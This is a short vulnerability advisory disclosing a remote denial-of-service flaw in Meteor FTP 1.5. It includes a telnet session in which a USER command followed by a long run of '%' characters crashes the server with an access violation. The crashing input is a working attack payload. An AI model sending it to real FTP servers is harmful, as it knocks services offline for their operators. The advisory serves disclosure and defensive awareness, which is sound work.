Meteor FTP Version 1.5 Remote Denial of Service Vulnerability

1. Introduction
----------------
Meteor FTP is a personal ftp server that runs on Windows98/ME/2K/XP.


2. Vulnerability
-----------------
A vulnerability exists in Meteor FTP Version 1.5, which allows any
malicious user to remotely cause a denial of service against the ftp
server.

By connecting to the Meteor FTP server and issuing USER followed by large
amounts of data, the ftp server will crash.


3. Example
-----------
Proof of concept exploit (meteordos.pl) is included in the attachment.

root@...nwire # telnet 192.168.1.14 21
Trying 192.168.1.14...
Connected to 192.168.1.14.
Escape character is '^]'.
220 Service ready for new user
USER
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
530 Not logged on
QUIT
Connection closed by foreign host.
root@...nwire # telnet 192.168.1.14 21
Trying 192.168.1.14...
Connected to 192.168.1.14.
Escape character is '^]'.
USER anonymous
QUIT
telnet> quit
Connection closed.

At this point the server has completely froze up. On the server side, the
Meteor FTP spits out a dialog :

"Error: Access Violation at 0x77FCC992 (Tried to write 0x25252525),
program terminated."

By clicking "OK", Meteor FTP terminates.



4. Vendor status
----------------
Vendor has been notified, waiting for response...
